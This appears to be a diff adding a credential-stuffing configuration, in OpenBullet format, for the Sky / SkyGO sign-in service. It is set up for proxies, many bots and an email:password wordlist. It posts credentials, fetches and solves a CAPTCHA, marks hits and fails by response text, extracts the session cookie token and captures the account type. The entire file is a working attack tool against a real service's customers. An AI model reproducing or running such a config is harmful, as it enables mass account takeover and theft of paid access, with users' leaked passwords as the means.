@@ -1,0 +1,83 @@
+[SETTINGS]
+{
+  "Name": "SkyGO",
+  "SuggestedBots": 25,
+  "LastModified": "2018-06-24T02:33:28.9439766+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_PAGE REQUEST GET "https://skyid.sky.com/signin?successUrl=https%3A%2F%2Fwww.sky.com%2Fwatch%2Fsky-go%2Fwindows&cancelUrl=https%3A%2F%2Fwww.sky.com%2Fwatch%2Fsky-go%2Fwindows" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#GET_MATRIXID REQUEST GET "https://skyidapp.sky.com/threatmetrix/session" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://skyid.sky.com/signin?successUrl=https%3A%2F%2Fwww.sky.com%2Fwatch%2Fsky-go%2Fwindows&cancelUrl=https%3A%2F%2Fwww.sky.com%2Fwatch%2Fsky-go%2Fwindows" 
+  HEADER "Origin: https://skyid.sky.com" 
+PARSE "<SOURCE>" JSON "session_id" Recursive=FALSE -> VAR "SESSIONID" "" "" 
+#POST_LOGIN REQUEST POST "https://skyid.sky.com/signin/7b613a2768747470733a2f2f7777772e736b792e636f6d2f77617463682f736b792d676f2f77696e646f7773272c623a2768747470733a2f2f7777772e736b792e636f6d2f77617463682f736b792d676f2f77696e646f7773277d" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&longLivedSession=on&remember=false&threatMetrixSessionId=<SESSIONID>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://skyid.sky.com/signin?successUrl=https%3A%2F%2Fwww.sky.com%2Fwatch%2Fsky-go%2Fwindows&cancelUrl=https%3A%2F%2Fwww.sky.com%2Fwatch%2Fsky-go%2Fwindows" 
+  HEADER "Origin: https://skyid.sky.com" 
+CAPTCHA "https://skyid.sky.com/captcha/jpeg?width=200&height=60&cachebuster=1529802705110" Base64=FALSE SendScreenshot=FALSE -> VAR "CAPTCHA" 
+#POST_LOGIN REQUEST POST "https://skyid.sky.com/securitycheck/skycom/7b613a2768747470733a2f2f7777772e736b792e636f6d2f77617463682f736b792d676f2f77696e646f7773272c623a2768747470733a2f2f7777772e736b792e636f6d2f77617463682f736b792d676f2f77696e646f7773272c703a277365637572697479636865636b277d" AutoRedirect=TRUE 
+  CONTENT "captcha=<CAPTCHA>&threatMetrixSessionId=<SESSIONID>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://skyid.sky.com/securitycheck/skycom/7b613a2768747470733a2f2f7777772e736b792e636f6d2f77617463682f736b792d676f2f77696e646f7773272c623a2768747470733a2f2f7777772e736b792e636f6d2f77617463682f736b792d676f2f77696e646f7773272c703a277365637572697479636865636b277d" 
+  HEADER "Origin: https://skyid.sky.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Sorry" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "Sorry" 
+#POST_LOGIN REQUEST GET "https://www.sky.com/watch/sky-go/windows" AutoRedirect=TRUE 
+  CONTENT "captcha=<CAPTCHA>&threatMetrixSessionId=<SESSIONID>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://skyid.sky.com/updatesecurityquestion/skycom/7b613a2768747470733a2f2f7777772e736b792e636f6d2f77617463682f736b792d676f2f77696e646f7773272c623a2768747470733a2f2f7777772e736b792e636f6d2f77617463682f736b792d676f2f77696e646f7773272c703a277365637572697479636865636b277d" 
+PARSE "<COOKIES(skyCEsidsso01)>" LR "" "" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#POST_LOGIN REQUEST GET "https://assets.sky.com/new/user-profile" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "skyusertoken: <TOKEN>" 
+  HEADER "Referer: https://www.sky.com/watch/sky-go/windows" 
+  HEADER "Origin: https://www.sky.com" 
+PARSE "<SOURCE>" JSON "usertype" Recursive=FALSE -> CAP "usertype" "" "" 
